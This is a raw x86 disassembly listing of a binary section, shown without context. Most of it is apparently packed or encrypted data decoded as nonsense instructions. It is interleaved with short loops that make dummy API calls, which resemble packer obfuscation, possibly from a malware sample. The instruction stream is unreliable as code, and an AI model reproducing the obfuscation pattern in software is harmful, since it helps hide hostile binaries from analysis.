  40afa9:	add    bh,ah
  40afab:	xchg   ch,bl
  40afad:	out    0xc7,al
  40afaf:	inc    eax
  40afb0:	cld    
  40afb1:	popf   
  40afb2:	imul   ebp,DWORD PTR [ebx],0xc05a96a7
  40afb8:	idiv   DWORD PTR [eax]
  40afba:	leave  
  40afbb:	imul   ecx,edi,0x77095572
  40afc1:	ror    DWORD PTR [esi],cl
  40afc3:	adc    al,0xe5
  40afc5:	(bad)  
  40afc6:	out    dx,al
  40afc7:	xchg   ecx,eax
  40afc8:	ret    0xb501
  40afcb:	stos   BYTE PTR es:[edi],al
  40afcc:	fisub  WORD PTR [ebp+0x44]
  40afcf:	repnz and al,BYTE PTR [esi-0x2d]
  40afd3:	jl     0x40afdf
  40afd5:	dec    edi
  40afd6:	(bad)  
  40afd7:	loop   0x40b024
  40afd9:	dec    ecx
  40afda:	ja     0x40af9a
  40afdc:	adc    ch,BYTE PTR [ebp+0x1a203249]
  40afe2:	retf   
  40afe3:	shr    BYTE PTR [ecx-0x7e],0xb1
  40afe7:	loop   0x40af6e
  40afe9:	adc    al,0xa3
  40afeb:	dec    esp
  40afec:	adc    eax,0x46db1f6f
  40aff1:	mov    dl,0xec
  40aff3:	cmp    edx,DWORD PTR [ecx+0x644428ae]
  40aff9:	scas   al,BYTE PTR es:[edi]
  40affa:	and    al,0x39
  40affc:	in     al,0x18
  40affe:	jmp    0xb703c8f6
  40b003:	push   ecx
  40b004:	daa    
  40b005:	jmp    edi
  40b007:	lds    edx,FWORD PTR [ebp-0x31ca202d]
  40b00d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b00e:	into   
  40b00f:	hlt    
  40b010:	ins    BYTE PTR es:[edi],dx
  40b011:	xor    ch,BYTE PTR [eax-0x3abcd444]
  40b017:	xchg   ecx,eax
  40b018:	es push 0x23750498
  40b01e:	mov    ecx,0x42f5cd9d
  40b023:	out    dx,eax
  40b024:	loop   0x40b02d
  40b026:	rol    DWORD PTR [ebp+eax*1+0x42b57017],cl
  40b02d:	xchg   ebx,eax
  40b02e:	out    0x53,eax
  40b030:	les    edx,FWORD PTR [ecx-0x38fe683b]
  40b036:	mov    ds:0xaf8328d7,eax
  40b03b:	addr16 rol eax,cl
  40b03e:	stc    
  40b03f:	int    0x8d
  40b041:	sub    eax,0x8345ba4a
  40b046:	popa   
  40b047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b048:	sub    eax,0x39d0b074
  40b04d:	in     eax,dx
  40b04e:	or     eax,0x6507ff4b
  40b053:	inc    ecx
  40b054:	sub    ecx,DWORD PTR [esi]
  40b056:	gs xchg dh,al
  40b059:	(bad)  
  40b05a:	mov    DWORD PTR [esi],esp
  40b05c:	stos   DWORD PTR es:[edi],eax
  40b05d:	mov    cl,0x4b
  40b05f:	push   edi
  40b060:	sub    ah,BYTE PTR [ecx+0x21]
  40b063:	ja     0x40b00b
  40b065:	mov    bl,0x5e
  40b067:	xchg   esp,eax
  40b068:	xchg   esi,eax
  40b069:	lods   eax,DWORD PTR ds:[esi]
  40b06a:	sub    BYTE PTR ds:0x59e3001a,dh
  40b070:	call   0x5dd4f13b
  40b075:	mov    ds:0x6e891b51,al
  40b07a:	push   edi
  40b07b:	dec    ebp
  40b07c:	jmp    0x9c7e:0xedd50863
  40b083:	dec    ebp
  40b084:	in     al,0xee
  40b086:	out    0xd9,eax
  40b088:	int3   
  40b089:	aas    
  40b08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b08b:	ss leave 
  40b08d:	je     0x40b0ba
  40b08f:	dec    ecx
  40b090:	push   cs
  40b091:	sbb    dh,BYTE PTR [edi]
  40b093:	or     al,0xf1
  40b095:	mov    dl,0xc7
  40b097:	cwde   
  40b098:	into   
  40b099:	lea    edi,[eax+0x33c233c4]
  40b09f:	repnz add eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    bl,BYTE PTR [eax]
  40b0da:	sbb    ebp,ebx
  40b0dc:	dec    esi
  40b0dd:	popf   
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b150
  40b0e6:	stos   BYTE PTR es:[edi],al
  40b0e7:	jmp    0x40b0b2
  40b0e9:	lock mov esi,0x1e83584
  40b0ef:	out    0x39,al
  40b0f1:	in     eax,dx
  40b0f2:	sub    al,0xe
  40b0f4:	adc    ch,dh
  40b0f6:	adc    edi,DWORD PTR [ebx+ebp*2]
  40b0f9:	pop    edi
  40b0fa:	jne    0x40b11a
  40b0fc:	retf   0x92aa
  40b0ff:	ss leave 
  40b101:	jge    0x40b148
  40b103:	call   0xf808:0x2226e0e6
  40b10a:	or     DWORD PTR [ebx-0xd9f4361],0x607ea4bc
  40b114:	mov    bh,0x82
  40b116:	inc    edi
  40b117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b118:	mov    edx,ebp
  40b11a:	pop    ebp
  40b11b:	adc    al,0x77
  40b11d:	xor    al,0x9f
  40b11f:	xchg   ebx,eax
  40b120:	ja     0x40b160
  40b122:	test   al,0x44
  40b124:	fld    TBYTE PTR [edx]
  40b126:	dec    esi
  40b127:	adc    al,0xbf
  40b129:	dec    ecx
  40b12a:	lods   eax,DWORD PTR ds:[esi]
  40b12b:	out    0x5f,al
  40b12d:	or     bh,dh
  40b12f:	or     BYTE PTR [esi],ch
  40b131:	fild   QWORD PTR [edi+edx*1-0x12]
  40b135:	addr16 fwait
  40b137:	dec    edx
  40b138:	nop
  40b139:	push   ebp
  40b13a:	cli    
  40b13b:	mov    es,WORD PTR [eax+0x5d9a9db3]
  40b141:	ja     0x40b1c2
  40b143:	sti    
  40b144:	xor    DWORD PTR [ebp+0x7075f6e4],eax
  40b14a:	cmp    ebx,ebx
  40b14c:	or     eax,0x910156d3
  40b151:	inc    edi
  40b152:	push   esi
  40b153:	cli    
  40b154:	out    0x2a,eax
  40b156:	adc    eax,0x2d4b4932
  40b15b:	xchg   esi,eax
  40b15c:	push   esp
  40b15d:	dec    ebp
  40b15e:	sbb    BYTE PTR fs:[si-0x6711],dh
  40b164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b165:	ins    DWORD PTR es:[edi],dx
  40b166:	outs   dx,BYTE PTR ds:[esi]
  40b167:	sbb    BYTE PTR [ebx-0x4c],bh
  40b16a:	mov    ebp,0x42892538
  40b16f:	das    
  40b170:	inc    edi
  40b171:	inc    edx
  40b172:	test   al,0xc4
  40b174:	(bad)
  40b177:	femms  
  40b179:	or     dh,BYTE PTR [ebx-0x1ec8e8e9]
  40b17f:	out    0xff,al
  40b181:	xchg   ebp,eax
  40b182:	dec    esp
  40b183:	retf   
  40b184:	mov    BYTE PTR [edi-0x355f4760],dl
  40b18a:	enter  0xcc87,0x2a
  40b18e:	popa   
  40b18f:	mov    ds,WORD PTR [eax-0x12]
  40b192:	(bad)  
  40b194:	push   ecx
  40b195:	add    BYTE PTR [edi-0x50],bl
  40b198:	dec    esi
  40b199:	push   ds
  40b19a:	lods   eax,DWORD PTR ds:[esi]
  40b19b:	mov    edx,0xfc46fbd6
  40b1a0:	lock in eax,0x2
  40b1a3:	push   cs
  40b1a4:	aas    
  40b1a5:	sbb    eax,0xa3a5434b
  40b1aa:	scas   eax,DWORD PTR es:[edi]
  40b1ab:	out    dx,eax
  40b1ac:	rcr    esp,cl
  40b1ae:	and    edx,DWORD PTR [ebp-0x2f]
  40b1b1:	vpsraw xmm3,xmm0,XMMWORD PTR [ebx+0x64]
  40b1b6:	push   ebx
  40b1b7:	mov    dl,0x5d
  40b1b9:	rol    ecx,1
  40b1bb:	inc    edi
  40b1bc:	inc    ebp
  40b1bd:	push   ecx
  40b1be:	push   eax
  40b1bf:	fiadd  DWORD PTR [ebp+0x7b]
  40b1c2:	fwait
  40b1c3:	aad    0x7f
  40b1c5:	scas   al,BYTE PTR es:[edi]
  40b1c6:	scas   eax,DWORD PTR es:[edi]
  40b1c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1c8:	dec    edi
  40b1c9:	add    dh,BYTE PTR [eax-0x1ca7f1b9]
  40b1cf:	sub    al,BYTE PTR [ecx-0x40]
  40b1d2:	(bad)  
  40b1d3:	dec    edx
  40b1d4:	pop    edi
  40b1d5:	mov    WORD PTR [edx+0x56],fs
  40b1d8:	add    dh,bl
  40b1da:	xor    esi,DWORD PTR [esp+edi*4+0xf]
  40b1de:	rol    ebx,cl
  40b1e0:	fidivr WORD PTR [eax+0x71]
  40b1e3:	pop    edi
  40b1e4:	push   ecx
  40b1e5:	jns    0x40b197
  40b1e7:	sahf   
  40b1e8:	or     DWORD PTR [ebx],eax
  40b1ea:	mov    al,BYTE PTR [ebp+0x542ff5da]
  40b1f0:	mov    eax,ds:0xa720de25
  40b1f5:	dec    ecx
  40b1f6:	pop    es
  40b1f7:	mov    edi,DWORD PTR [edx]
  40b1f9:	dec    ebx
  40b1fa:	jmp    0xe10a:0xacde0166
  40b201:	imul   edx,edx,0x5034e8bf
  40b207:	cmc    
  40b208:	dec    edi
  40b209:	in     al,0x1a
  40b20b:	rcl    BYTE PTR ds:0x4d40ee17,1
  40b211:	outs   dx,DWORD PTR ds:[esi]
  40b212:	loop   0x40b264
  40b214:	xor    esp,edi
  40b216:	out    dx,al
  40b217:	or     edx,esi
  40b219:	iret   
  40b21a:	js     0x40b1d6
  40b21c:	(bad)  
  40b21d:	mov    cl,0xea
  40b21f:	call   0x2fe4:0x1b45f694
  40b226:	out    0x79,al
  40b228:	lahf   
  40b229:	enter  0x59f7,0x52
  40b22d:	repnz std 
  40b22f:	or     DWORD PTR [edi+0x57],edi
  40b232:	mov    al,0xc
  40b234:	xor    bh,BYTE PTR [edi-0xb]
  40b237:	xor    DWORD PTR [esp+esi*2+0x7e],esp
  40b23b:	mov    esp,0x99045351
  40b240:	cmp    ch,BYTE PTR [eax+0x2e]
  40b243:	sbb    al,0x4b
  40b245:	inc    esi
  40b246:	adc    al,BYTE PTR [ecx-0x13b649ad]
  40b24c:	hlt    
  40b24d:	xchg   edi,eax
  40b24e:	inc    ebp
  40b24f:	shl    DWORD PTR [ecx-0x1],1
  40b252:	mov    al,0x3
  40b254:	lds    edi,FWORD PTR [esi-0x20a9e481]
  40b25a:	xchg   edx,eax
  40b25b:	sub    BYTE PTR [esi],bl
  40b25d:	push   esp
  40b25e:	cmc    
  40b25f:	shl    DWORD PTR [ebx-0xa01eb],1
  40b265:	std    
  40b266:	mov    dh,0x5b
  40b268:	(bad)  
  40b26b:	mov    dl,cl
  40b26d:	call   edx
  40b26f:	not    ebx
  40b271:	adc    esi,DWORD PTR [ebx]
  40b273:	inc    ebx
  40b274:	add    eax,esp
  40b276:	in     eax,dx
  40b277:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b279:	and    eax,0x69740c9f
  40b27e:	call   0x9cea1784
  40b283:	sub    esp,DWORD PTR [eax+0x31]
  40b286:	cmp    ch,BYTE PTR [eax+edx*4-0x36915dcb]
  40b28d:	push   ss
  40b28e:	adc    dh,0x94
  40b291:	les    ebp,FWORD PTR [esi-0x51]
  40b294:	adc    eax,ebp
  40b296:	cmp    dh,BYTE PTR [eax+0x4]
  40b299:	arpl   bp,di
  40b29b:	lock push es
  40b29d:	push   ss
  40b29e:	cmp    dh,bh
  40b2a0:	lods   eax,DWORD PTR ds:[esi]
  40b2a1:	pop    ecx
  40b2a2:	std    
  40b2a3:	sti    
  40b2a4:	mov    eax,0x75ca582e
  40b2a9:	fisttp QWORD PTR [ecx-0x5a77747d]
  40b2af:	sbb    BYTE PTR [esi+ebp*1-0x45],bl
  40b2b3:	sahf   
  40b2b4:	pop    edx
  40b2b5:	in     eax,0x69
  40b2b7:	cmp    al,0x9
  40b2b9:	fmulp  st(1),st
  40b2bb:	xchg   edi,eax
  40b2bc:	mov    BYTE PTR ds:0xc6078545,al
  40b2c2:	(bad)  
  40b2c3:	pop    esi
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43066e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43067a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	(bad)  
  40b2f1:	xchg   ecx,eax
  40b2f2:	aas    
  40b2f3:	icebp  
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b357
  40b2fd:	ins    BYTE PTR es:[edi],dx
  40b2fe:	cmp    ah,dl
  40b300:	std    
  40b301:	pop    ecx
  40b302:	popf   
  40b303:	aaa    
  40b304:	mov    gs,WORD PTR [eax]
  40b306:	and    ebp,DWORD PTR [eax-0x2bfcec9f]
  40b30c:	jnp    0x40b2dd
  40b30e:	jl     0xfbe6f490
  40b314:	jecxz  0x40b376
  40b316:	cwde   
  40b317:	ret    
  40b318:	lds    ebp,FWORD PTR [ebp+0x2c]
  40b31b:	stc    
  40b31c:	lock xchg esp,eax
  40b31e:	push   esi
  40b31f:	or     al,0xe3
  40b322:	add    esi,ebp
  40b324:	sbb    esp,ecx
  40b326:	jns    0x40b3a6
  40b328:	mov    al,0x2d
  40b32a:	mov    ecx,DWORD PTR ds:0x4f409590
  40b330:	dec    ebx
  40b331:	fxrstor [edi]
  40b334:	loope  0x40b389
  40b336:	pop    ebx
  40b337:	xor    BYTE PTR [eax-0x7813f8b8],0xe9
  40b33e:	mov    bh,0x5e
  40b340:	xchg   DWORD PTR [edx],eax
  40b342:	cld    
  40b343:	mov    ah,0x7e
  40b345:	sbb    DWORD PTR ds:0x2b3a7be0,0xffffffec
  40b34c:	and    bl,BYTE PTR [eax-0x30]
  40b34f:	dec    ecx
  40b350:	xchg   ebx,eax
  40b351:	lods   eax,DWORD PTR ds:[esi]
  40b352:	or     DWORD PTR [edi],esi
  40b354:	out    dx,eax
  40b355:	stc    
  40b356:	hlt    
  40b357:	shl    DWORD PTR [eax],1
  40b359:	adc    al,0xf8
  40b35b:	loope  0x40b2f5
  40b35d:	adc    DWORD PTR [eax-0x18],esi
  40b360:	jb     0x40b3d0
  40b362:	push   cs
  40b363:	push   0xd07fb346
  40b368:	mov    ah,0xed
  40b36a:	push   ecx
  40b36b:	iret   
  40b36c:	jns    0x40b360
  40b36e:	fnstenv [esi-0x357896f4]
  40b374:	sbb    DWORD PTR [ebx+0x1e745cfe],ebp
  40b37a:	adc    al,0xa
  40b37c:	and    edi,edi
  40b37e:	mov    DWORD PTR [ecx+esi*4-0x374ae841],edi
  40b385:	inc    edx
  40b386:	dec    eax
  40b387:	dec    eax
  40b388:	pop    ecx
  40b389:	xor    BYTE PTR [ecx-0x4af8ddc4],bl
  40b38f:	aaa    
  40b390:	adc    DWORD PTR [eax+0x138fb867],ebp
  40b396:	dec    ecx
  40b397:	push   esp
  40b398:	jb     0x40b327
  40b39a:	push   ss
  40b39b:	jl     0x40b400
  40b39d:	sub    esp,DWORD PTR [eax]
  40b39f:	push   edx
  40b3a0:	es test edx,eax
  40b3a3:	dec    eax
  40b3a4:	loopne 0x40b3ab
  40b3a6:	mov    ebp,0xc031b054
  40b3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3ac:	outs   dx,BYTE PTR ds:[esi]
  40b3ad:	mov    edx,0xee5bca9d
  40b3b2:	xchg   ebx,eax
  40b3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b4:	xchg   ecx,eax
  40b3b5:	mov    al,ds:0xce4cec3f
  40b3ba:	ror    BYTE PTR cs:[esi],0xc1
  40b3be:	xor    DWORD PTR [ebp+0x455be4c9],ecx
  40b3c4:	inc    BYTE PTR [ebx+0x6f]
  40b3c7:	in     al,dx
  40b3c8:	xor    eax,0x399b19c0
  40b3cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3ce:	xchg   esi,eax
  40b3cf:	(bad)  
  40b3d0:	mov    al,ds:0x9aef46ad
  40b3d5:	pop    ss
  40b3d6:	add    ebp,DWORD PTR [edx+0x31]
  40b3d9:	std    
  40b3da:	xor    al,0x82
  40b3dc:	stos   BYTE PTR es:[edi],al
  40b3dd:	lods   eax,DWORD PTR ds:[esi]
  40b3de:	rcr    DWORD PTR [esi-0x16],cl
  40b3e1:	ret    0x45d1
  40b3e4:	shl    BYTE PTR [esi-0x48],1
  40b3e7:	into   
  40b3e8:	cs (bad) 
  40b3ea:	stc    
  40b3eb:	push   DWORD PTR [edi-0x18]
  40b3ee:	pop    ds
  40b3ef:	rcl    ah,0x9
  40b3f2:	adc    BYTE PTR [esi],ch
  40b3f4:	mov    ebx,0x55821701
  40b3f9:	icebp  
  40b3fa:	cmp    eax,0x5414255b
  40b3ff:	sahf   
  40b400:	lods   al,BYTE PTR ds:[esi]
  40b401:	(bad)  
  40b402:	icebp  
  40b403:	mov    WORD PTR [edi],ss
  40b405:	out    dx,eax
  40b406:	(bad)  
  40b407:	jb     0x40b481
  40b409:	inc    ebx
  40b40a:	xchg   esi,eax
  40b40b:	ins    BYTE PTR es:[edi],dx
  40b40c:	mov    edx,eax
  40b40e:	adc    ah,BYTE PTR [esi]
  40b410:	add    DWORD PTR [ecx],0x6f
  40b413:	test   bl,0x9d
  40b416:	pop    edi
  40b417:	ror    DWORD PTR [eax-0x2c711a5a],1
  40b41d:	cld    
  40b41e:	sub    eax,0x7896ed66
  40b423:	outs   dx,DWORD PTR ds:[esi]
  40b424:	xchg   ebx,eax
  40b425:	std    
  40b426:	ret    
  40b427:	icebp  
  40b428:	sbb    DWORD PTR [edi+0x6f],0xffffffa6
  40b42c:	fmul   QWORD PTR [eax-0x558aabf7]
  40b432:	jo     0x40b485
  40b434:	dec    ecx
  40b435:	or     dh,BYTE PTR [edx]
  40b437:	mov    cl,0x20
  40b439:	div    BYTE PTR [ecx]
  40b43b:	sub    DWORD PTR [edx],eax
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x43064e,0x11
  40b44e:	cmp    DWORD PTR ds:0x43064e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43064e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42ebe8
  40b479:	mov    eax,ds:0x43064e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43064e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4305ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430642
  40b4aa:	sbb    DWORD PTR ds:0x42e862,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ef14
  40b4b8:	sub    DWORD PTR ds:0x43058e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430646,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430596,0x42e86a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ef1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e862,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430646,0x430592
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e85e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4305a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4305a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4305a6,edi
  40b536:	cmp    DWORD PTR ds:0x4305a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4305a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ef1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42ebec
  40b560:	cmp    DWORD PTR ds:0x4305a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4305a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4305a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430592
  40b591:	xor    DWORD PTR ds:0x4305ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4305be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430586
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43063e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43063e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43063e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43063e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42ebf0
  40b5f7:	cmp    DWORD PTR ds:0x43063e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43063e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43063e,edi
  40b613:	cmp    DWORD PTR ds:0x43063e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x28824dc4
  40b63f:	cmp    ch,BYTE PTR [eax-0x44]
  40b642:	in     eax,0x7e
  40b644:	jle    0x40b685
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b697
  40b64a:	inc    ecx
  40b64b:	mov    WORD PTR [ebx+ecx*2+0x26],?
  40b64f:	or     bh,ch
  40b651:	jnp    0x40b62f
  40b653:	(bad)  
  40b654:	ficomp WORD PTR [ebx]
  40b656:	cmp    DWORD PTR [edi+0x68],esi
  40b659:	lahf   
  40b65a:	je     0x40b665
  40b65c:	and    dl,ah
  40b65e:	call   DWORD PTR [edx+eax*8+0x397e2db0]
  40b665:	test   al,0x2
  40b667:	xor    eax,0xdcaae246
  40b66c:	bound  edx,QWORD PTR [esi-0x6a]
  40b66f:	inc    eax
  40b670:	push   esi
  40b671:	push   cs
  40b672:	test   BYTE PTR [eax+0x39],bh
  40b675:	mov    ebp,0x4c1353aa
  40b67a:	push   edx
  40b67b:	mov    eax,ds:0x4bbe320a
  40b680:	push   edi
  40b681:	jnp    0x40b647
  40b683:	add    DWORD PTR [ecx],esi
  40b685:	push   0xb3bfa4ca
  40b68a:	and    al,0x1e
  40b68c:	mov    esi,0x52c3060a
  40b691:	jg     0x40b675
  40b693:	(bad)  
  40b694:	repz xor BYTE PTR [ebp+0x76],dh
  40b698:	cmpxchg DWORD PTR [eax],esp
  40b69b:	or     al,0x89
  40b69d:	push   ss
  40b69e:	mov    eax,ds:0x1ffec988
  40b6a3:	mov    eax,0x8eeb8628
  40b6a8:	sub    ebp,0xffffffab
  40b6ab:	bound  ebx,QWORD PTR [ebp+0x24167be4]
  40b6b1:	xchg   ebp,eax
  40b6b2:	pop    esi
  40b6b3:	jns    0x40b674
  40b6b5:	dec    esp
  40b6b6:	or     ch,ch
  40b6b8:	(bad)  
  40b6b9:	pushf  
  40b6ba:	cmp    al,BYTE PTR [ecx]
  40b6bc:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b6be:	je     0x40b707
  40b6c0:	sub    DWORD PTR [ebx-0x6f39c9d],ebx
  40b6c6:	int    0x28
  40b6c8:	xchg   DWORD PTR [ebx+0x73],ecx
  40b6cb:	imul   esi,DWORD PTR [ebp+0x48ac46f8],0xc557329b
  40b6d5:	add    dh,BYTE PTR ds:0xdbf890d8
  40b6db:	pop    eax
  40b6dc:	cdq    
  40b6dd:	xchg   ecx,eax
  40b6de:	and    edx,ebx
  40b6e0:	mov    bh,0xc1
  40b6e2:	cmc    
  40b6e3:	mov    ecx,0xd2acef1d
  40b6e8:	pop    ds
  40b6e9:	xor    esi,DWORD PTR [eax-0x130fca45]
  40b6ef:	out    dx,eax
  40b6f0:	in     eax,dx
  40b6f1:	pop    es
  40b6f2:	mov    WORD PTR [ebp+0x3997ddb6],ds
  40b6f8:	mov    dh,dl
  40b6fa:	retf   0xdef1
  40b6fd:	fsub   QWORD PTR [ebx-0x2cd57fda]
  40b703:	inc    edx
  40b704:	mov    DWORD PTR [ebp-0x1af1a7ca],esi
  40b70a:	fs or  eax,0x1e12bb15
  40b710:	lock ds jmp 0x40b6eb
  40b714:	or     eax,0xb5b8591a
  40b719:	pop    ss
  40b71a:	mov    bh,0xf3
  40b71c:	cwde   
  40b71d:	sbb    eax,0x606234be
  40b722:	test   BYTE PTR [eax-0x5a2f17b3],bl
  40b728:	cli    
  40b729:	adc    al,0xc1
  40b72b:	mov    bh,0x1b
  40b72d:	xchg   ebp,eax
  40b72e:	daa    
  40b72f:	sub    dh,ch
  40b731:	xchg   DWORD PTR [ebp-0x66369aa8],ecx
  40b737:	popa   
  40b738:	in     al,0x4a
  40b73a:	shl    DWORD PTR [ebx-0x48],1
  40b73d:	aaa    
  40b73e:	add    DWORD PTR [esi],0xa
  40b741:	enter  0x9b29,0x6b
  40b745:	test   eax,0xe21b44a
  40b74a:	jmp    0x6ad0:0x3f781654
  40b751:	test   BYTE PTR [eax-0x76],ah
  40b754:	lods   eax,DWORD PTR ds:[esi]
  40b755:	mov    esi,ebx
  40b757:	test   BYTE PTR [eax+0x77],ah
  40b75a:	scas   eax,DWORD PTR es:[edi]
  40b75b:	mov    ch,0x8a
  40b75d:	pop    ebx
  40b75e:	dec    edx
  40b75f:	iret   
  40b760:	sahf   
  40b761:	xchg   esp,eax
  40b762:	jae    0x40b73e
  40b764:	sub    eax,0xe3f2a19f
  40b769:	(bad)  
  40b76a:	mov    esi,0x9e70887d
  40b76f:	push   edx
  40b770:	lock lock lods eax,DWORD PTR ds:[esi]
  40b773:	out    0x24,eax
  40b775:	add    dh,BYTE PTR [edi]
  40b777:	stc    
  40b778:	mov    ebp,0xdb9babfe
  40b77d:	push   ecx
  40b77e:	fisub  WORD PTR [ebx-0x16a74cd0]
  40b784:	aas    
  40b785:	xchg   edx,eax
  40b786:	cdq    
  40b787:	lods   eax,DWORD PTR ds:[esi]
  40b788:	ins    DWORD PTR es:[edi],dx
  40b789:	cli    
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x4305b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430642
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0x9863f97
  40b7b0:	or     DWORD PTR [ebp-0x1a],edi
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b778
  40b7ba:	or     eax,DWORD PTR [ebp-0x3d]
  40b7bd:	xor    dl,BYTE PTR [ecx+0x3bbc378]
  40b7c3:	mov    ch,0x77
  40b7c5:	repnz and BYTE PTR [esp+ebx*4-0x3f],ch
  40b7ca:	fcmovnb st,st(1)
  40b7cc:	arpl   WORD PTR [edx-0xa09dd29],dx
  40b7d2:	mov    cs,WORD PTR [edi]
